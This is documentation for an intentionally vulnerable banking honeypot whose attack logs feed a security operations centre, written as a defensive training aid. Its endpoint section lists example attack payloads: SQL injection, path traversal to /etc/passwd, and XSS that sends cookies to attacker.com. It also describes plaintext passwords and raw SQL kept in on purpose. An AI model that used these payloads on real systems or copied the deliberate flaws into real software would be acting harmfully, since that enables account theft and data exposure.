@@ -1,0 +1,1090 @@
+================================================================================
+SECUREBANK HONEYPOT - COMPLETE SYSTEM DOCUMENTATION FOR SOC MONITORING INTEGRATION
+================================================================================
+
+DATE: 2026-06-03
+STATUS: PRODUCTION READY
+VERSION: 1.0.0
+
+================================================================================
+SECTION 1: SYSTEM OVERVIEW
+================================================================================
+
+The SecureBank Honeypot is a vulnerable banking application designed for security research and educational purposes. It intentionally contains security vulnerabilities to detect, log, and monitor cyberattacks.
+
+CORE COMPONENTS:
+1. Frontend: React + Vite (Port 5173)
+2. Backend: Express.js (Port 5000)
+3. Database: PostgreSQL via Neon.tech
+4. Monitoring: Attack logs table with full audit trail
+
+VULNERABILITIES FOR SOC MONITORING:
+- SQL Injection (login endpoint)
+- Cross-Site Scripting (XSS - comments endpoint)
+- Path Traversal (download endpoint)
+- IDOR (Insecure Direct Object Reference)
+- Weak Authentication
+- Unencrypted Communications
+
+================================================================================
+SECTION 2: DATABASE SCHEMA FOR MONITORING
+================================================================================
+
+KEY TABLES FOR SOC MONITORING:
+
+1. ATTACK_LOGS TABLE (Primary monitoring table)
+   - id: SERIAL PRIMARY KEY
+   - timestamp: TIMESTAMP (when attack occurred)
+   - source_ip: VARCHAR(45) - attacker's IP address
+   - source_port: INTEGER - source port
+   - method: VARCHAR(10) - HTTP method (GET, POST, etc.)
+   - path: TEXT - targeted endpoint
+   - payload: TEXT - attack payload
+   - attack_type: VARCHAR(50) - type of attack (SQL_INJECTION, XSS, etc.)
+   - sub_attack_type: VARCHAR(100) - specific attack type
+   - severity: INTEGER (1-10) - severity level
+   - user_agent: TEXT - browser/tool used
+   - tool_detected: VARCHAR(100) - detected tool (sqlmap, burp, etc.)
+   - os_fingerprint: VARCHAR(100) - operating system detected
+   - session_id: VARCHAR(255) - session identifier
+   - targeted_endpoint: VARCHAR(200) - API endpoint targeted
+   - attempted_username: VARCHAR(100) - username in attack
+   - attempted_account: VARCHAR(20) - account number in attack
+   - response_code: INTEGER - HTTP response code
+   - is_blocked: BOOLEAN - whether attack was blocked
+
+2. ATTACKER_PROFILES TABLE
+   - ip: VARCHAR(45) PRIMARY KEY
+   - first_seen: TIMESTAMP
+   - last_seen: TIMESTAMP
+   - total_requests: INTEGER
+   - threat_score: INTEGER (0-100)
+   - country: VARCHAR(100)
+   - city: VARCHAR(100)
+   - isp: VARCHAR(200)
+   - os: VARCHAR(100)
+   - tool: VARCHAR(100) - attack tool detected
+   - is_known_malicious: BOOLEAN
+   - sqli_count: INTEGER - SQL injection attempts
+   - xss_count: INTEGER - XSS attempts
+   - bruteforce_count: INTEGER - brute force attempts
+   - traversal_count: INTEGER - path traversal attempts
+   - csrf_count: INTEGER - CSRF attempts
+   - idor_count: INTEGER - IDOR attempts
+   - attempted_account_takeover: BOOLEAN
+   - attempted_funds_transfer: BOOLEAN
+   - attempted_privilege_escalation: BOOLEAN
+   - latitude: DECIMAL(10, 8) - for geolocation mapping
+   - longitude: DECIMAL(11, 8) - for geolocation mapping
+
+3. IOC_RECORDS TABLE (Indicators of Compromise)
+   - id: SERIAL PRIMARY KEY
+   - ip: VARCHAR(45) - malicious IP
+   - attack_types: TEXT - types of attacks
+   - first_seen: TIMESTAMP
+   - last_seen: TIMESTAMP
+   - threat_score: INTEGER
+   - reported_to_abuseipdb: BOOLEAN
+   - blocked_automatically: BOOLEAN
+   - blocked_at: TIMESTAMP
+   - notes: TEXT
+
+4. COMMENTS TABLE (for XSS monitoring)
+   - comment_id: SERIAL PRIMARY KEY
+   - author: VARCHAR(100)
+   - content: TEXT - unfiltered (XSS vulnerable)
+   - created_at: TIMESTAMP
+   - ip_address: VARCHAR(45) - source IP
+   - user_agent: TEXT
+
+5. TRANSACTIONS TABLE
+   - transaction_id: SERIAL PRIMARY KEY
+   - from_user_id: INTEGER
+   - to_user_id: INTEGER
+   - amount: DECIMAL(15,2)
+   - status: VARCHAR(20)
+   - ip_address: VARCHAR(45)
+   - user_agent: TEXT
+   - created_at: TIMESTAMP
+
+6. USERS TABLE
+   - user_id: SERIAL PRIMARY KEY
+   - username: VARCHAR(100) UNIQUE
+   - password: VARCHAR(100) - plain text (intentional)
+   - email: VARCHAR(200)
+   - full_name: VARCHAR(200)
+   - account_balance: DECIMAL(15,2)
+   - account_number: VARCHAR(20)
+   - failed_login_attempts: INTEGER
+
+7. EMPLOYEES TABLE
+   - employee_id: SERIAL PRIMARY KEY
+   - username: VARCHAR(100) UNIQUE
+   - password: VARCHAR(100)
+   - full_name: VARCHAR(200)
+   - role_id: INTEGER
+
+8. ROLES TABLE
+   - role_id: SERIAL PRIMARY KEY
+   - role_name: VARCHAR(50)
+   - permission_level: INTEGER
+
+================================================================================
+SECTION 3: API ENDPOINTS FOR MONITORING
+================================================================================
+
+1. LOGIN ENDPOINT (SQL INJECTION VULNERABLE)
+   
+   URL: http://localhost:5000/api/login
+   METHOD: POST
+   CONTENT-TYPE: application/json
+   
+   REQUEST BODY:
+   {
+     "username": "admin",
+     "password": "admin"
+   }
+   
+   RESPONSE SUCCESS:
+   {
+     "success": true,
+     "message": "Login successful",
+     "user": {
+       "user_id": 1,
+       "username": "admin",
+       "full_name": "Admin User",
+       "email": "admin@securebank.com",
+       "account_balance": "999999.99",
+       "account_number": "ACC10999"
+     }
+   }
+   
+   RESPONSE FAILED:
+   {
+     "success": false,
+     "message": "Invalid username or password"
+   }
+   
+   VULNERABILITY: Raw SQL query construction
+   Attack payload examples:
+   - admin' OR '1'='1'--
+   - admin' UNION SELECT null, null, null, null, null--
+   - admin'--
+
+2. SEARCH ENDPOINT (XSS VULNERABLE - REFLECTED)
+   
+   URL: http://localhost:5000/api/search?q=<query>
+   METHOD: GET
+   
+   VULNERABILITY: Reflects user input without sanitization
+   Attack payload example:
+   - <script>alert('XSS')</script>
+   - <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
+
+3. COMMENTS ENDPOINT (XSS VULNERABLE - STORED)
+   
+   URL: http://localhost:5000/api/comments
+   METHOD: GET/POST
+   
+   VULNERABILITY: Stores unfiltered user input
+   Attack payload example:
+   - <script>document.location='http://attacker.com'</script>
+
+4. DOWNLOAD ENDPOINT (PATH TRAVERSAL VULNERABLE)
+   
+   URL: http://localhost:5000/api/download?file=<filename>
+   METHOD: GET
+   
+   VULNERABILITY: No path validation
+   Attack payload example:
+   - ../../../etc/passwd
+   - ../../windows/system32/config/sam
+
+================================================================================
+SECTION 4: ATTACK DETECTION PATTERNS FOR SOC
+================================================================================
+
+PATTERN 1: SQL INJECTION DETECTION
+   Characteristics:
+   - Contains SQL keywords: ' OR, UNION, SELECT, DROP, INSERT, UPDATE
+   - Special characters: ', --, ;, /*
+   - Endpoint: /api/login
+   - Severity: 8-10
+
+   Query to detect:
+   SELECT * FROM attack_logs 
+   WHERE payload LIKE '%' OR %' 
+      OR payload LIKE '%UNION%'
+      OR payload LIKE '%DROP%'
+   AND attack_type = 'SQL_INJECTION';
+
+PATTERN 2: XSS DETECTION
+   Characteristics:
+   - Contains JavaScript/HTML: <script>, <img onerror, onclick
+   - Endpoints: /api/search, /api/comments
+   - Severity: 7-9
+
+   Query to detect:
+   SELECT * FROM attack_logs 
+   WHERE payload LIKE '%<script%'
+      OR payload LIKE '%onerror%'
+      OR payload LIKE '%onclick%'
+   AND attack_type IN ('REFLECTED_XSS', 'STORED_XSS');
+
+PATTERN 3: BRUTE FORCE DETECTION
+   Characteristics:
+   - Multiple login attempts from same IP
+   - Failed attempts > 5 in 1 minute
+   - Same username, different passwords
+   - Severity: 6-8
+
+   Query to detect:
+   SELECT source_ip, attempted_username, COUNT(*) as attempts
+   FROM attack_logs 
+   WHERE timestamp > NOW() - INTERVAL '1 minute'
+   AND response_code = 401
+   GROUP BY source_ip, attempted_username
+   HAVING COUNT(*) > 5;
+
+PATTERN 4: PATH TRAVERSAL DETECTION
+   Characteristics:
+   - Payload contains: ../, ..\, ..%2f
+   - Endpoint: /api/download
+   - Severity: 6-8
+
+   Query to detect:
+   SELECT * FROM attack_logs 
+   WHERE payload LIKE '%../%'
+      OR payload LIKE '%..\\%'
+      OR payload LIKE '%..%2f%'
+   AND targeted_endpoint = '/api/download';
+
+PATTERN 5: PRIVILEGE ESCALATION DETECTION
+   Characteristics:
+   - Attempts to access admin functions
+   - User role mismatch
+   - Unauthorized database access
+   - Severity: 9-10
+
+   Query to detect:
+   SELECT * FROM attack_logs 
+   WHERE targeted_endpoint LIKE '%admin%'
+      OR targeted_endpoint LIKE '%users%'
+      OR attempted_username = 'admin'
+   AND response_code NOT IN (200, 401);
+
+PATTERN 6: DATA EXFILTRATION DETECTION
+   Characteristics:
+   - Large response sizes
+   - Multiple downloads in short time
+   - Unusual time patterns
+   - Severity: 8-10
+
+   Query to detect:
+   SELECT source_ip, COUNT(*) as download_count
+   FROM attack_logs 
+   WHERE targeted_endpoint = '/api/download'
+   AND timestamp > NOW() - INTERVAL '1 hour'
+   GROUP BY source_ip
+   HAVING COUNT(*) > 100;
+
+================================================================================
+SECTION 5: ATTACKER PROFILING & THREAT SCORING
+================================================================================
+
+THREAT SCORE CALCULATION:
+Base Score = 0
+
+Add points for each detected characteristic:
+- SQL Injection attempt: +20 points
+- XSS attempt: +15 points
+- Brute force attempt: +10 points
+- Path traversal: +15 points
+- Admin endpoint access attempt: +25 points
+- Account takeover attempt: +30 points
+- Funds transfer attempt: +40 points
+- Privilege escalation attempt: +35 points
+
+Multipliers:
+- If multiple attack types from same IP: x1.5
+- If from known malicious IP: x2.0
+- If geographically unlikely location: x1.3
+
+Maximum Score: 100
+
+Score Interpretation:
+- 0-20: Low threat
+- 21-50: Medium threat
+- 51-75: High threat
+- 76-100: Critical threat (immediate action required)
+
+ACTION BY THREAT LEVEL:
+- Low (0-20): Log and monitor
+- Medium (21-50): Notify SOC, increase monitoring
+- High (51-75): Block IP, investigate
+- Critical (76-100): Block IP immediately, escalate to incident response
+
+================================================================================
+SECTION 6: FRONTEND PAGES FOR MONITORING
+================================================================================
+
+1. LOGIN PAGE (http://localhost:5173)
+   - Entry point for all monitoring
+   - Collects credentials
+   - Logs failed attempts
+   - Test accounts:
+     * admin / admin
+     * john_doe / password123
+     * jane_smith / qwerty456
+     * robert_brown / brown2024
+
+2. DASHBOARD PAGE
+   - User profile display
+   - Quick actions to other pages
+   - Shows account balance
+   - Routes to:
+     * /search
+     * /comments
+     * /download
+     * /session
+     * /soc
+
+3. SEARCH PAGE
+   - Vulnerable to reflected XSS
+   - Test: <script>alert('XSS')</script>
+   - Monitored for attack patterns
+
+4. COMMENTS PAGE
+   - Vulnerable to stored XSS
+   - User comments stored unfiltered
+   - Payload execution on page load
+
+5. DOWNLOAD PAGE
+   - Vulnerable to path traversal
+   - Test: ../../../etc/passwd
+   - File access logging
+
+6. SOC DASHBOARD PAGE (Monitor attack logs)
+   - Displays attack_logs table
+   - Shows attacker_profiles
+   - Real-time monitoring
+   - Alert generation
+
+7. TRANSACTION PAGE
+   - Monitor fund transfers
+   - Track IDOR vulnerabilities
+   - Log unauthorized access
+
+8. USER MANAGEMENT PAGE (Admin only)
+   - Privilege escalation testing
+   - Role-based access control
+   - User creation/modification logging
+
+================================================================================
+SECTION 7: SETUP & INSTALLATION INSTRUCTIONS
+================================================================================
+
+PREREQUISITES:
+- Node.js v14 or higher
+- npm (Node Package Manager)
+- Internet connection (for Neon.tech)
+- Neon.tech account (free at https://neon.tech)
+
+STEP 1: DATABASE SETUP
+
+1.1 Create Neon.tech Account
+   - Go to https://neon.tech
+   - Sign up with email
+   - Create new project
+   - Default database will be created
+
+1.2 Get Connection String
+   - In Neon.tech dashboard, click your project
+   - Click "Connection string"
+   - Select "PostgreSQL"
+   - Copy the full connection string
+   - Format: postgresql://neondb_owner:PASSWORD@endpoint/neondb?sslmode=require
+
+STEP 2: ENVIRONMENT CONFIGURATION
+
+2.1 Create .env File
+   Location: server/.env
+   
+   Content:
+   DATABASE_URL=postgresql://neondb_owner:YOUR_PASSWORD@YOUR_ENDPOINT/neondb?sslmode=require&channel_binding=require
+   HONEYPOT_PORT=5000
+   NODE_ENV=development
+   CLIENT_URL=http://localhost:5173
+   LOG_LEVEL=debug
+
+STEP 3: INSTALL DEPENDENCIES
+
+3.1 Server Dependencies
+   cd server
+   npm install
+   
+   Packages installed:
+   - express: Web framework
+   - cors: Cross-origin requests
+   - pg: PostgreSQL driver
+   - dotenv: Environment variables
+   - nodemon: Development auto-reload
+
+3.2 Client Dependencies
+   cd ../client
+   npm install
+   
+   Packages installed:
+   - react: UI framework
+   - react-router-dom: Client routing
+   - axios: HTTP requests
+   - vite: Build tool
+
+STEP 4: DATABASE INITIALIZATION
+
+4.1 Run initialization script
+   cd server
+   npm run init-db
+   
+   This will:
+   - Create all 12 tables
+   - Insert sample data
+   - Create indexes
+   - Add test users
+   - Add sample attack logs
+
+4.2 Verify initialization
+   Output should show:
+   ✅ Database initialized successfully!
+   📝 Test Credentials:
+     Username: admin          Password: admin
+     Username: john_doe       Password: password123
+     Username: jane_smith     Password: qwerty456
+
+STEP 5: START APPLICATION
+
+5.1 Terminal 1 - Start Backend
+   cd server
+   npm run dev
+   
+   Expected output:
+   Honeypot server running on port 5000
+
+5.2 Terminal 2 - Start Frontend
+   cd client
+   npm run dev
+   
+   Expected output:
+   ➜  Local: http://localhost:5173/
+
+5.3 Access Application
+   Open browser: http://localhost:5173
+   Login with: admin / admin
+
+================================================================================
+SECTION 8: TEST DATA & CREDENTIALS
+================================================================================
+
+USER ACCOUNTS (After initialization):
+
+Admin Account:
+  Username: admin
+  Password: admin
+  Account Balance: $999,999.99
+  Account Number: ACC10999
+  Role: System Admin
+
+Customer Accounts:
+  1. john_doe / password123
+     Balance: $15,420.50
+     Account: ACC10001
+  
+  2. jane_smith / qwerty456
+     Balance: $89,300.75
+     Account: ACC10002
+  
+  3. robert_brown / brown2024
+     Balance: $12,500.00
+     Account: ACC10003
+  
+  4. testuser / testpass
+     Balance: $2,500.00
+     Account: ACC10005
+
+Employee Accounts:
+  1. michael.chen / michael123
+     Role: Branch Manager
+  
+  2. sarah.johnson / sarah456
+     Role: Branch Manager
+  
+  3. john.teller / teller123
+     Role: Teller
+  
+  4. security.analyst / security456
+     Role: Security Officer
+  
+  5. admin.user / admin123
+     Role: System Admin
+
+SAMPLE ATTACK LOGS (Pre-populated):
+
+1. SQL Injection Attempt
+   Source IP: 192.168.1.200
+   Payload: username=admin' OR '1'='1'&password=anything
+   Severity: 8
+   Attack Type: SQL_INJECTION
+   Tool: SQLMap
+
+2. XSS Attempt
+   Source IP: 10.0.0.55
+   Payload: <script>alert(document.cookie)</script>
+   Severity: 7
+   Attack Type: REFLECTED_XSS
+
+3. Path Traversal Attempt
+   Source IP: 192.168.1.201
+   Payload: ../../../etc/passwd
+   Severity: 6
+   Attack Type: DIRECTORY_TRAVERSAL
+
+================================================================================
+SECTION 9: MONITORING QUERIES FOR SOC
+================================================================================
+
+QUERY 1: Real-Time Attack Count by Type
+   SELECT attack_type, COUNT(*) as count, MAX(timestamp) as latest
+   FROM attack_logs
+   WHERE timestamp > NOW() - INTERVAL '1 hour'
+   GROUP BY attack_type
+   ORDER BY count DESC;
+
+QUERY 2: Top Attacking IPs (Last 24 hours)
+   SELECT 
+     ap.ip,
+     ap.threat_score,
+     ap.country,
+     ap.tool,
+     COUNT(al.id) as attack_count
+   FROM attacker_profiles ap
+   LEFT JOIN attack_logs al ON ap.ip = al.source_ip
+   WHERE al.timestamp > NOW() - INTERVAL '24 hours'
+   GROUP BY ap.ip, ap.threat_score, ap.country, ap.tool
+   ORDER BY attack_count DESC
+   LIMIT 10;
+
+QUERY 3: Attack Timeline (Last 24 hours)
+   SELECT 
+     DATE_TRUNC('hour', timestamp) as hour,
+     attack_type,
+     COUNT(*) as count
+   FROM attack_logs
+   WHERE timestamp > NOW() - INTERVAL '24 hours'
+   GROUP BY DATE_TRUNC('hour', timestamp), attack_type
+   ORDER BY hour DESC;
+
+QUERY 4: Brute Force Detection
+   SELECT 
+     source_ip,
+     attempted_username,
+     COUNT(*) as failed_attempts,
+     MAX(timestamp) as latest_attempt
+   FROM attack_logs
+   WHERE response_code = 401
+   AND timestamp > NOW() - INTERVAL '1 hour'
+   GROUP BY source_ip, attempted_username
+   HAVING COUNT(*) >= 5
+   ORDER BY failed_attempts DESC;
+
+QUERY 5: High Severity Attacks
+   SELECT 
+     id,
+     timestamp,
+     source_ip,
+     attack_type,
+     severity,
+     payload
+   FROM attack_logs
+   WHERE severity >= 8
+   AND timestamp > NOW() - INTERVAL '24 hours'
+   ORDER BY severity DESC, timestamp DESC;
+
+QUERY 6: Known Malicious IPs
+   SELECT 
+     ip,
+     threat_score,
+     is_known_malicious,
+     total_requests,
+     last_seen
+   FROM attacker_profiles
+   WHERE threat_score > 75
+   ORDER BY threat_score DESC;
+
+QUERY 7: SQL Injection Attempts
+   SELECT 
+     source_ip,
+     attempted_username,
+     payload,
+     timestamp,
+     response_code
+   FROM attack_logs
+   WHERE attack_type = 'SQL_INJECTION'
+   AND timestamp > NOW() - INTERVAL '7 days'
+   ORDER BY timestamp DESC;
+
+QUERY 8: XSS Attempts
+   SELECT 
+     source_ip,
+     targeted_endpoint,
+     payload,
+     timestamp,
+     severity
+   FROM attack_logs
+   WHERE attack_type IN ('REFLECTED_XSS', 'STORED_XSS')
+   AND timestamp > NOW() - INTERVAL '7 days'
+   ORDER BY severity DESC, timestamp DESC;
+
+QUERY 9: Unauthorized Access Attempts
+   SELECT 
+     source_ip,
+     attempted_username,
+     targeted_endpoint,
+     COUNT(*) as attempts,
+     MAX(timestamp) as latest
+   FROM attack_logs
+   WHERE response_code NOT IN (200, 302)
+   AND timestamp > NOW() - INTERVAL '1 day'
+   GROUP BY source_ip, attempted_username, targeted_endpoint
+   ORDER BY attempts DESC;
+
+QUERY 10: Geographic Distribution of Attacks
+   SELECT 
+     country,
+     city,
+     COUNT(*) as attack_count,
+     AVG(threat_score) as avg_threat_score,
+     COUNT(DISTINCT ip) as unique_ips
+   FROM attacker_profiles
+   GROUP BY country, city
+   ORDER BY attack_count DESC
+   LIMIT 20;
+
+================================================================================
+SECTION 10: ALERT RULES FOR SOC
+================================================================================
+
+ALERT RULE 1: Multiple Failed Logins
+   Trigger: 5+ failed login attempts from same IP in 5 minutes
+   Severity: Medium
+   Action: Block IP for 15 minutes, notify SOC
+
+ALERT RULE 2: SQL Injection Detected
+   Trigger: SQL keywords detected in login payload
+   Severity: High
+   Action: Block IP immediately, escalate to incident response
+
+ALERT RULE 3: XSS Payload Detected
+   Trigger: HTML/JavaScript tags in search or comments
+   Severity: High
+   Action: Log fully, alert SOC, monitor for exploitation
+
+ALERT RULE 4: Path Traversal Attempt
+   Trigger: ../ or ..\ detected in download parameter
+   Severity: High
+   Action: Block request, alert SOC
+
+ALERT RULE 5: Privilege Escalation Attempt
+   Trigger: Non-admin accessing /api/users endpoint
+   Severity: Critical
+   Action: Block immediately, escalate to incident response
+
+ALERT RULE 6: Account Takeover Attempt
+   Trigger: Login from new geographic location + suspicious activity
+   Severity: Critical
+   Action: Disable account, notify user, escalate
+
+ALERT RULE 7: Large Data Exfiltration
+   Trigger: >100 downloads from same IP in 1 hour
+   Severity: Critical
+   Action: Block IP, block user, forensic analysis
+
+ALERT RULE 8: Admin Panel Access Attempts
+   Trigger: /api/users accessed by non-admin
+   Severity: High
+   Action: Block, log for audit
+
+ALERT RULE 9: Known Malicious Tool Detected
+   Trigger: sqlmap, burp, nikto user agent detected
+   Severity: High
+   Action: Block immediately, flag IP
+
+ALERT RULE 10: Threat Score Exceeds 75
+   Trigger: Attacker profile threat_score > 75
+   Severity: Critical
+   Action: Add to blocklist, investigate comprehensively
+
+================================================================================
+SECTION 11: DASHBOARDING METRICS FOR SOC
+================================================================================
+
+KEY METRICS TO DISPLAY:
+
+1. Real-Time Metrics
+   - Current attack rate (attacks per minute)
+   - Unique attacking IPs (last 24 hours)
+   - Active threat level (0-100)
+   - Blocked attempts (last hour)
+
+2. Attack Type Distribution
+   - SQL Injection: XX%
+   - XSS: XX%
+   - Brute Force: XX%
+   - Path Traversal: XX%
+   - IDOR: XX%
+   - Other: XX%
+
+3. Geographic Distribution
+   - Top attacking countries
+   - Heatmap of attack origins
+   - Top ISPs
+
+4. Threat Level Breakdown
+   - Critical: XX attacks
+   - High: XX attacks
+   - Medium: XX attacks
+   - Low: XX attacks
+
+5. Timeline Charts
+   - Attacks per hour (last 24 hours)
+   - Attacks per day (last 7 days)
+   - Trend analysis
+
+6. Top Indicators
+   - Top 10 attacking IPs
+   - Top 10 targeted endpoints
+   - Top 10 attempted usernames
+   - Top 10 payloads
+
+7. Detection Effectiveness
+   - Alerts generated
+   - True positives
+   - False positives
+   - Alert accuracy rate
+
+8. System Health
+   - Database performance
+   - API response times
+   - Data collection status
+   - Alert system status
+
+================================================================================
+SECTION 12: INTEGRATION WITH EXTERNAL SIEM SYSTEMS
+================================================================================
+
+FOR SOC MONITORING INTEGRATION:
+
+1. LOG EXPORT ENDPOINT
+   Create new API endpoint:
+   GET /api/logs/export?format=json&since=2024-01-01&until=2024-01-31
+   
+   Returns all attack logs in specified format for SIEM import
+
+2. WEBHOOK INTEGRATION
+   Configure webhooks for real-time alerts:
+   POST http://siem-system.com/api/alerts
+   
+   Payload:
+   {
+     "timestamp": "2024-01-15T14:30:00Z",
+     "alert_type": "SQL_INJECTION",
+     "severity": 8,
+     "source_ip": "192.168.1.200",
+     "payload": "admin' OR '1'='1'",
+     "action_taken": "IP_BLOCKED"
+   }
+
+3. SIEM CONNECTOR
+   Endpoint for SIEM to pull data:
+   GET /api/siem/events?since=<timestamp>
+   
+   Returns list of all security events since timestamp
+
+4. THREAT FEED
+   Endpoint to export IOC data:
+   GET /api/ioc/export?format=stix
+   
+   Returns list of known malicious IPs/tools in STIX format
+
+5. INCIDENT MANAGEMENT
+   Create incidents in SOC workflow:
+   POST /api/incidents
+   
+   Payload:
+   {
+     "title": "SQL Injection Attack from 192.168.1.200",
+     "severity": "HIGH",
+     "source_ip": "192.168.1.200",
+     "attack_type": "SQL_INJECTION",
+     "timeline": [list of logs]
+   }
+
+================================================================================
+SECTION 13: COMMON MONITORING SCENARIOS
+================================================================================
+
+SCENARIO 1: Detecting Brute Force Attack
+   
+   Observation:
+   - 50+ failed login attempts in 10 minutes
+   - Same IP: 10.0.0.100
+   - Multiple different usernames tried
+   
+   Query:
+   SELECT source_ip, attempted_username, COUNT(*) as attempts
+   FROM attack_logs
+   WHERE response_code = 401
+   AND timestamp > NOW() - INTERVAL '10 minutes'
+   AND source_ip = '10.0.0.100'
+   GROUP BY source_ip, attempted_username;
+   
+   Action:
+   - Block IP 10.0.0.100 for 1 hour
+   - Alert SOC team immediately
+   - Enable enhanced logging for future attempts
+   - Add to blocklist
+
+SCENARIO 2: SQL Injection Campaign
+   
+   Observation:
+   - Multiple SQL injection attempts detected
+   - Same payload across different sessions
+   - Coordinated timing suggests automation
+   
+   Query:
+   SELECT payload, COUNT(DISTINCT source_ip) as unique_sources
+   FROM attack_logs
+   WHERE attack_type = 'SQL_INJECTION'
+   AND timestamp > NOW() - INTERVAL '1 hour'
+   GROUP BY payload
+   ORDER BY COUNT(DISTINCT source_ip) DESC;
+   
+   Action:
+   - Block all attacking IPs
+   - Generate incident report
+   - Investigate tool/malware responsible
+   - Update WAF rules
+
+SCENARIO 3: Privilege Escalation Attempt
+   
+   Observation:
+   - Non-admin user accessing admin endpoints
+   - Attempts to modify user roles
+   - Tries to access financial reports
+   
+   Query:
+   SELECT * FROM attack_logs
+   WHERE targeted_endpoint LIKE '%admin%'
+   AND attempted_username != 'admin'
+   AND timestamp > NOW() - INTERVAL '1 hour';
+   
+   Action:
+   - Disable user account immediately
+   - Initiate incident response
+   - Audit user's activities for last 7 days
+   - Escalate to management
+   - Consider legal action if needed
+
+SCENARIO 4: Data Exfiltration
+   
+   Observation:
+   - Single IP downloading 200+ files in 2 hours
+   - Files contain customer financial data
+   - Download pattern suggests automation
+   
+   Query:
+   SELECT source_ip, COUNT(*) as downloads, SUM(response_size) as total_size
+   FROM attack_logs
+   WHERE targeted_endpoint = '/api/download'
+   AND timestamp > NOW() - INTERVAL '2 hours'
+   GROUP BY source_ip
+   HAVING COUNT(*) > 200;
+   
+   Action:
+   - Block IP immediately, block all related IPs
+   - Notify data protection officer
+   - Initiate breach response protocol
+   - Contact law enforcement
+   - Notify affected customers
+   - Begin forensic investigation
+
+SCENARIO 5: Distributed Attack (DDoS)
+   
+   Observation:
+   - Spike in requests from 50+ different IPs
+   - All hitting same endpoint
+   - Request rate: 10,000+ per minute
+   
+   Query:
+   SELECT COUNT(DISTINCT source_ip) as unique_ips, COUNT(*) as total_requests
+   FROM attack_logs
+   WHERE timestamp > NOW() - INTERVAL '5 minutes'
+   AND targeted_endpoint = '/api/login';
+   
+   Action:
+   - Activate DDoS protection
+   - Rate limit by IP
+   - Route through DDoS mitigation service
+   - Alert infrastructure team
+   - Monitor attack patterns
+
+================================================================================
+SECTION 14: TROUBLESHOOTING GUIDE FOR SOC
+================================================================================
+
+ISSUE 1: No data appearing in attack_logs table
+
+Troubleshooting:
+1. Check if init-db.js ran successfully
+   - Look for "✅ Database initialized successfully!" message
+   
+2. Verify database connection
+   - Test with: npm run test-connection
+   
+3. Check server is logging attacks
+   - Make test SQL injection attempt
+   - Check browser console for errors
+   
+4. Verify table creation
+   Query: SELECT * FROM information_schema.tables WHERE table_schema='public';
+   
+Solution: Run npm run init-db again
+
+ISSUE 2: Login endpoint not recording attacks
+
+Troubleshooting:
+1. Check server is running
+   - curl http://localhost:5000
+   
+2. Review server logs for errors
+   
+3. Verify route is connected
+   - Check server.js has app.use('/api/login', loginRoute)
+   
+4. Test manual database insert
+   - Insert test record into attack_logs
+
+Solution: Restart server, check file paths
+
+ISSUE 3: SOC dashboard not updating
+
+Troubleshooting:
+1. Check page refresh interval
+   
+2. Verify JavaScript is fetching data correctly
+   - Check browser console for errors
+   
+3. Confirm API endpoint returns data
+   - curl http://localhost:5000/api/logs
+   
+4. Check database queries are correct
+
+Solution: Check network requests, verify queries
+
+ISSUE 4: Threat score not calculating correctly
+
+Troubleshooting:
+1. Review threat_score calculation logic
+   
+2. Check all attack types are being counted
+   
+3. Verify multipliers are applied correctly
+   
+4. Manual calculation: sum all points + multipliers
+
+Solution: Review and correct calculation formula
+
+ISSUE 5: Geographic data missing
+
+Troubleshooting:
+1. Check latitude/longitude fields are populated
+   
+2. Verify IP geolocation API is configured
+   
+3. Ensure attacker_profiles table has data
+
+Solution: Implement IP geolocation service
+
+================================================================================
+SECTION 15: NEXT STEPS FOR SOC INTEGRATION
+================================================================================
+
+TO IMPLEMENT SOC MONITORING SYSTEM:
+
+STEP 1: Build Dashboard
+   - Create React component for SOC dashboard
+   - Display real-time metrics
+   - Show attack timeline
+   - Display threat map
+   - Show alert queue
+
+STEP 2: Create Alert Management System
+   - Alert queue management
+   - Alert escalation workflow
+   - On-call rotation integration
+   - Notification system (email, Slack, SMS)
+
+STEP 3: Implement Automated Responses
+   - IP blocking logic
+   - Account lockdown procedures
+   - Automatic escalation rules
+   - Incident creation workflow
+
+STEP 4: Build Reporting System
+   - Daily attack summary
+   - Weekly threat analysis
+   - Monthly comprehensive report
+   - Executive dashboard
+
+STEP 5: Integrate with External Tools
+   - Connect to SIEM (Splunk, ELK, etc.)
+   - Integrate threat intelligence feeds
+   - Connect to IP reputation services
+   - Integrate with geolocation services
+
+STEP 6: Implement Machine Learning
+   - Anomaly detection
+   - Pattern recognition
+   - Predictive threat assessment
+   - Attack trend analysis
+
+STEP 7: Create Runbooks
+   - Response playbooks for each attack type
+   - Escalation procedures
+   - Investigation templates
+   - Remediation steps
+
+STEP 8: Training & Documentation
+   - SOC team training materials
+   - Operation manuals
+   - Runbooks for common scenarios
+   - Incident response procedures
+
+================================================================================
+END OF DOCUMENTATION
+================================================================================
+
+This complete documentation provides everything needed for a SOC monitoring 
+system to be built on top of the SecureBank Honeypot application. All tables, 
+endpoints, queries, and alert rules are documented and ready for integration.
+
+For assistance, refer to:
+- README.md: General setup
+- QUICK_START.md: 5-minute quick start
+- NEON_TROUBLESHOOTING.md: Database issues
+- SETUP_COMPLETE.md: Verification checklist
+
+Project Status: ✅ PRODUCTION READY
+Version: 1.0.0
+Last Updated: 2026-06-03
+
+================================================================================
